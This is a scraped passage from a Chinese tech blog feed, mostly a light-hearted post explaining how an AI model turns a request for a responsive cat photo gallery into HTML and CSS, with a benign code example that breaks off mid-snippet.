<h3 data-id="heading-12">4. 端口被占用</h3>
<ul>
<li>解决方案：修改<code>UDP_PORT</code>（如改为10000），并在服务端添加<code>SO_REUSEADDR</code>选项（代码已包含）。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🤖 当人工智能开始“写”前端：一场硅基的艺术创作]]></title>    <link>https://juejin.cn/post/7581698635866390554</link>    <guid>https://juejin.cn/post/7581698635866390554</guid>    <pubDate>2025-12-10T01:50:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581698635866390554" data-draft-id="7581738974424481811" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🤖 当人工智能开始“写”前端：一场硅基的艺术创作"/> <meta itemprop="keywords" content="人工智能,HTML,LLM"/> <meta itemprop="datePublished" content="2025-12-10T01:50:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🤖 当人工智能开始“写”前端：一场硅基的艺术创作
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:50:45.000Z" title="Wed Dec 10 2025 01:50:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAMAAACahl6sAAAAQlBMVEVHcEwlRnqtZBj76q4lRnolRnolRnolRnolRnokRnr/gGtrVUeLXDBKTl+hYSHasW7Ik0zs0JG4dCvUdEE0SW+rYxrLQJfjAAAACnRSTlMA////0H/xUaMi5MCoTwAACfVJREFUeNrtnQl3qygUgJ9GXAqosfL//+pgmgXwXmRNJGdu55xO+6rx8+6I8O9fehmGriN93zdN07bVXdpW/ih/SbpuGP6dXbpOXv7z2i3S9ISck2eQOnAhMHG64VQQbmrAaM4B05GmipaGdB+m6BNQPBXzMYtKR3EPbB/RS5eY4g+lIW9WBqnySCvVMrzRpqqs0g9nwVg5p1KYlHEchRT5bftp+y3n6xlQDjAkABtrKULU9f377ev+4/1/NiT+URRiZRhrcZP6WLa/Gq005BORaqXsdYEuHPIP798ZxSyt6d5sVfxJESRCsvB32lfXwhRjnUBGmKXNoJQe04VIASJqRC/9G7yDsyQMiloYz+0pHYghEoPISAGgpDSvHsCoMwmA0mfjSG5UOsqah2RodkljzMkhZZdamiEDB8+Nsbk9T04yGNljDXGOZZ6u0+Tj9DuvbyNJBuPO0ABtLNPlJtfZJ4CNNCWJoY8gddwxNpm9YrHh9DEkBoeMud4Kma8XRZaYpBJOYvg59U9wOsblMvmGrzQe30dyqFZ1dxPfO0FT5BOdw989THVs4q1TFk+iN4PMu7CaLpd4EJOExNaJLE4d0xQKYpJ0cY5Ozcwwu6WOu2cs9TUYxPB4b4fvLRzTUXbT1HH7y0BnB0j6CAehkPFfFzd1TMsi6sU1/P4VM9NiISHBlYnBMR+kad075sXlmMehj1twnfTUqJH4GJfqIKte7S72emPnHbdiYHIB0e6ATjKq1UoTaFh6wBL2csMIVo9fH/v6QRHAgoxrOHQQxG/36tC1ODmGOeBGBRmXalgcdhDQ1xF1vI6a3DF2d4r7G1enOUgNOshlFq7qUCxrca9ldiCam7ilxRbP6JbOYsYtfLFmkcXEgLG1DN/6eroxHjqh5bh+Uw27e1oWVK7pN+AqwzUcq/UYTPw8nWufLFBHN2zcxLRYlmGPs6rA2Wy0uJe/E7TknbHIa1WH1bLA8DAj3JpxET+FCNCWZ5uNT6jxTPZK/1mXoCBeKlGLRT2lP69XN3XdqqCojKX1ZVda6iD2McjeXSHa0I+AHd2InGAJgjRVM6gOBfygDrarRJnho6eQBbrns+HkcNUCWtYClJa66qFgPbqqZEBTCOAgRqxCOhQBWpZeIC6QBq91hEoI5unTjsMsK9DCFigY9WNn19hgVCrELalrTw6WnYMYzjHhQ2/7G2xTx1HvwpzSe4cVi5ORQQwMW9+72FU5L4gGsa6Yu1RcDeIhs64Qs8izt0vGH+n9/IKaIlYpM2UqkYOrwwq5CgBjWpyGtxaonxe4KaJ3hx+7O0HaqVkxLBPj8FmBVmjNevIUFhUuDmMq5NDV9RwyPe/95IvxAhG7ymqxHGE5sZJL2kPLUhUinkXfrnFwGFwXD99djNLSFh/meXEb2B6Oyiwm0I7BC+OlTlOVPk9K8CIYzu5YHwKDTI6XAo5lz3WEqEXwQRKhh5cyLa6D81P4PXBw984as9YaGXHwx4Ba8rmOldUat/BHt9cQ38AaljnBdCJqs60OcXVDJZP//ZwSWtV9FpHNtgg22KuYx/U2tB5Mcp1TYOiphNhiFjgWeJ3DL2OZpuuUisIoUyzZEJ76I+LmyqWdv8LwnEiwMYczihjxeqtBsuFJSTg2oD1ETQx4v6D1VleSZW1xCwvAfVGWpQ069kgrQksAUW2rReYzsboIjSABuDQX0QJwB9cnZVgWVgE31vrklAJnEmVObykgYCk/VGX5OlpuKb5eiovUAvJ2tMstw0kIkNdpiSA91K6XA6K8CVCyr4PePhTo65q3DyX7OpTbSVk1PB62mhJ9HSpSqtKaESxsFRm0tLBVcvTV+vbBrLRK4hC7aitN9B0ZpX6vNMgjGIt5ZdmMv32KrmprD1afsPd4FEhThK0+WfTl3kpd482AGvG3jQdZK1+t8ireDswhofigRb3fxfI/4jj+xkffUX/1ccxxhEP9qyyBEH9Cx9vhf8TB7eiSpBHjZVSa4whQMJC1TqIR6q8RERtjOr2ID0yx3oYi0oAIvZCPz4eG64p3ObuREeOHUIR3MBVJwq9yll5P7KHdiPBOiOoRa/AjXz21J3k04l+i8OjErj4kaXWQiIVO/EvA+KLRAEnUVomtjPd6SvR3RLoeMT54nKFH1EqtkkEGFaQuTlSQrsxhRiOIt51S/Ho8B11+FUlwRaHnU4utEI38/mgSjRJ8PhWEtN6Z6WcncQOU4efjKoh3zfi7/+DfhPrwOZ9a/iYBiVJJxPlei3CqIDTYEqAPFow5/c71fAdVIwmo4n+cTIGbr2n9NULAE5ifcNNS63hvEOFk0wxYnICBBZ0I9xERBVILF0uggNdxuOkR4S6ngvgPmArzHv4KpMKGQFjQ+Rw6q9dC6R6dgZaJF7RVWIH0BTY9h+fz0ohHOyLuy+He/hN4GUR3/RxcBx2f76izarI9CaXmzRmhNQuSfIgJkva5GzN6HJbhQxCNsDGDSh56plmef6sg2eaXPsYBt5W+H6VE6omG6hOS1w4hiTWiThbJ1YO+RSO1vrpMlomf6nhQGz0m7qT6W04XOUHyzhZ4rkG+0hxL66oDW9mnPWyL3TMmssxyQUwr01CHX7b2OvUIaqS48TnMtAoEQTQixJeAlDfSiGmk/l8jpwIpTyFqOfeNIHWBooC036ERtUQp2tm/CKT5jjySbxTlvUVj2yhjvyWDVL3yfKRojXwLSEWUp7q0PBAKPp7m5YGoT3WH7wAZ1BeOywNZv3Gak/LIqriwxbQ5jaTcsEW1eb+FvoWo+zr5V/IUOvNtsapU2zJXSyj0xVB13sPfq0kkZA7dubIIKXIlJ8Cy7u+BN22RVcr+peOuxHdcBbA04FAVmEoEtO5vX55K4KVZS1QJvBBzU1rgUl8JapBNYIowLoZtD9NWRTWKqqe36L48BSz8QPH9epqqIDehlh2UuqocEmrdV7AvhuRoM74m80yeDIEX3ppreNN235FxV58DNjhswn5K8zK21+5ctjut6NmUIoy9tVvitnHr2VDM3ahtW8KQ/Vbsp9GGiWHfk8skyTSFz9/HdxhHe4uR/RxX/mG1SGXwypcDJNmCMfucZ/C1CuCQUbiBUDYbe7tiRkZX8GIat50d+wqR1fdN7ygGzrHrcN4kGFHK02cil5M6INgQVsvnNz77T5PqUFYJJInYmIBplJfP5On4eiOwYfhuCD44oLyYVs43rI1rk3H7usttzq8Qo3j84vavN9mOkAeuq8dHEd9NtCVKX51Oen+MM6IEYvz5StOehKLpIjD+nKU5AQWJpLizdB+1sb5LQvFRxbSJVGHmSdK/0WWaPguEYmcSJ68aWkK6rAw6jwSSCmrTWVHT96R7HwHANEgqybVJL+E2vE2q7Uu91Gr73SbbNUvZDtiOlCeIv4r/AI+0XUwz1lvcAAAAAElFTkSuQmCC");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"❝";top:8px;left:5px}.markdown-body blockquote:after{content:"❞";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🧠 第一幕：AI脑袋里的“算盘”是怎么打的？</h2>
<p>想象一个 AI 坐在电脑前（当然，它并没有椅子，也没有咖啡 ☕），它面对一个人类的请求：</p>
<blockquote>
<p>“请帮我写一个响应式的网页，能展示猫咪的照片，还要有按钮切换。”</p>
</blockquote>
<p>对于你我，这是个编码任务；<br/>
对于 AI，这是一个<strong>语言理解 + 逻辑推理 + 生成代码</strong>的过程。</p>
<p>底层其实分成三步走：</p>
<ol>
<li>
<p><strong>语义理解（Semantic Understanding）</strong><br/>
AI 首先得明白“展示猫咪的照片”这句话的意思。这一步相当于它在脑中生成一个抽象的网页结构树（有点类似 DOM，但是是脑内的）。</p>
</li>
<li>
<p><strong>模式搜索（Pattern Matching）</strong><br/>
接着它会在记忆中搜索“网页”、“响应式”、“按钮”等的最佳实现方式。换句话说，它在思考：</p>
<blockquote>
<p>“嗯，我以前看过这种写法，大概 HTML 要一层容器，一个 <code>img</code>，再加一个 <code>button</code> 来切换图片。”</p>
</blockquote>
</li>
<li>
<p><strong>代码生成（Code Generation）</strong><br/>
当逻辑结构敲定，AI 就开始“敲键盘”——准确来说，是在语言模型的概率分布里，逐词预测出正确的 HTML、CSS 和 JavaScript。</p>
</li>
</ol>
<p>🎷这就像即兴爵士：没有固定的谱子，但每个音符都“合理”。</p>
<hr/>
<h2 data-id="heading-1">💡 第二幕：AI 是怎么编织 HTML 那张“蛛网”的</h2>
<p>HTML（超文本标记语言）其实是最像“诗”的程序语言。<br/>
AI 在生成 HTML 时，并不是死记硬背模板，而是在<strong>搭建语义结构</strong>。</p>
<p>AI 想的逻辑大致如下（伪思维模式💭）：</p>
<pre><code class="hljs language-css" lang="css">我需要一个网页
│
├── 顶部：标题区域 &lt;<span class="hljs-selector-tag">header</span>&gt;
│
├── 中间：展示内容 &lt;<span class="hljs-selector-tag">main</span>&gt;
│    │
│    ├── 图片容器 &lt;<span class="hljs-selector-tag">div</span>&gt;
│    └── 按钮区域 &lt;<span class="hljs-selector-tag">button</span>&gt;
│
└── 底部：版权信息 &lt;<span class="hljs-selector-tag">footer</span>&gt;
</code></pre>
<p>然后，它会根据上下文补充必要的属性，比如：</p>
<ul>
<li>“响应式” → 加入 <code>meta viewport</code></li>
<li>“切换图片” → 准备按钮和 JS 脚本</li>
<li>“猫咪” → 加载一张可爱的示例图片 🐱</li>
</ul>
<p>于是，AI 生成的 HTML 就像下面这样：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>AI的猫咪画廊<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
    <span class="hljs-selector-tag">body</span> {
      <span class="hljs-attribute">font-family</span>: sans-serif;
      <span class="hljs-attribute">text-align</span>: center;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">2rem</span>;
      <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to bottom, <span class="hljs-number">#ffe6f2</span>, <span class="hljs-number">#fff</span>);
    }
    <span class="hljs-selector-tag">img</span> {
      <span class="hljs-attribute">max-width</span>: <span class="hljs-number">90%</span>;
      <span class="hljs-attribute">height</span>: auto;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
      <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">10px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);
    }
    <span class="hljs-selector-tag">button</span> {
      <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">1rem</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">0.6rem</span> <span class="hljs-number">1.2rem</span>;
      <span class="hljs-attribute">border</span>: none;
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ff99cc</span>;
      <span class="hljs-attribute">color</span>: white;
      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1rem</span>;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
      <span class="hljs-attribute">cursor</span>: pointer;
    }
    <span class="hljs-selector-tag">button</span><span class="hljs-selector-pseudo">:hover</span> {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ff6699</span>;
    }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>🐾 欢迎来到 AI 的猫咪画廊<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"catImg"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://placekitten.com/400/300"</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">"Cute cat"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
